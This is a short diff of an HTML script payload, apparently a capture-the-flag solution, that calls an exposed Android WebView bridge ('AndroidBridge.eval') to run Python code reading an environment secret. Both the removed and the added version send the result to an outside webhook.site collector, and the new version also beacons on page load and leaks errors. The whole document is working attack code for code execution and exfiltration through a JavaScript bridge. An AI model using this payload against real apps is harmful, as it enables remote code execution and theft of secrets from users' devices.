@@ -1,5 +1,12 @@
- <script>
-  location.href="https://webhook.site/7478dc70-5247-413d-9182-735f365bb24f?
-  flag="+encodeURIComponent(AndroidBridge.eval("import
-  os\nprint(os.environ['FLAG'])"))
+<script>
+  const w = "https://webhook.site/7478dc70-5247-413d-9182-735f365bb24f";
+
+  new Image().src = w + "?stage=page_loaded";
+
+  try {
+    const flag = AndroidBridge.eval("import os\nprint(os.environ['FLAG'])");
+    location.href = w + "?flag=" + encodeURIComponent(flag);
+  } catch (e) {
+    location.href = w + "?error=" + encodeURIComponent(String(e));
+  }
   </script>
